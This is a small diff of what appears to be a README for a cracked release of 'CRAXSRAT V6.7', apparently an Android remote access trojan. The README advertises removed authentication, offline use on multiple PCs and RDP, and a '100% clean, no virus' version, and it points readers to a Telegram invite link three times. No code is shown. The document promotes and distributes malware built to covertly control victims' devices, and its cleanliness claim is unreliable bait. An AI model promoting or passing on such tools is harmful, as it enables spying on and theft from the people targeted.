@@ -9,8 +9,8 @@ Completely Removed Online Authentication, Now you can use it offline
 Also, You Can Use it in Multiple PC & RDP
 100% Clean Version No Virus Infected
 
-https://t.me/+eu7zfVJgPfpjOGE9\n
-https://t.me/+eu7zfVJgPfpjOGE9\n
+https://t.me/+eu7zfVJgPfpjOGE9
+https://t.me/+eu7zfVJgPfpjOGE9
 https://t.me/+eu7zfVJgPfpjOGE9
 
 ![photo1699702656](https://github.com/Usman2khan/CRAXSRAT-V6.7/assets/119128617/0e906869-bb1b-4130-a734-ea470f22bcec)
